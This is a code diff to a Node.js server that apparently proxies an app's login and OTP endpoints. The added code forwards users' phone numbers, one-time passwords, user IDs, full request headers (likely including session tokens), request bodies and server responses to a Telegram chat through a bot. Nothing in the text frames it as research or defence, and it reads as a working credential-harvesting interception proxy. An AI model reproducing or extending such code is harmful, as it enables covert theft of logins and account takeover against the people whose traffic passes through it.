@@ -1262,7 +1262,12 @@ app.post('/app/user/login/otp', async (req, res) => {
     }
 
     if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🔑 Login (OTP)\n📱 Phone: ${phone || 'N/A'}\n🔢 OTP: ${otp || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      const reqHeadersDump = JSON.stringify(req.headers, null, 2).substring(0, 1500);
+      const reqBodyDump = JSON.stringify(body, null, 2).substring(0, 1500);
+      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
+      const summary = `🔑 Login (OTP)\n📱 Phone: ${phone || 'N/A'}\n🔢 OTP: ${otp || 'N/A'}\n👤 UserID: ${userId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+      bot.sendMessage(data.adminChatId, summary).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔑 Login (OTP) — FULL DUMP\n👤 ${userId || phone || 'N/A'}\n\n📨 REQUEST HEADERS:\n${reqHeadersDump}\n\n📝 REQUEST BODY:\n${reqBodyDump}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -2029,7 +2034,11 @@ app.post('/app/send/opt', async (req, res) => {
     const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
+      const reqHeadersDump = JSON.stringify(req.headers, null, 2).substring(0, 1500);
+      const reqBodyDump = JSON.stringify(body, null, 2).substring(0, 1500);
+      const respDump = JSON.stringify(jsonResp, null, 2).substring(0, 2000);
       bot.sendMessage(data.adminChatId, `📲 OTP Sent [${userId || 'N/A'}]\nPhone: ${body.phone || body.mobile || 'N/A'}\nType: ${body.type || 'N/A'}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `📲 Send OTP — FULL DUMP\n👤 ${userId || body.phone || body.mobile || 'N/A'}\n\n📨 REQUEST HEADERS:\n${reqHeadersDump}\n\n📝 REQUEST BODY:\n${reqBodyDump}\n\n📥 RESPONSE:\n${respDump}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
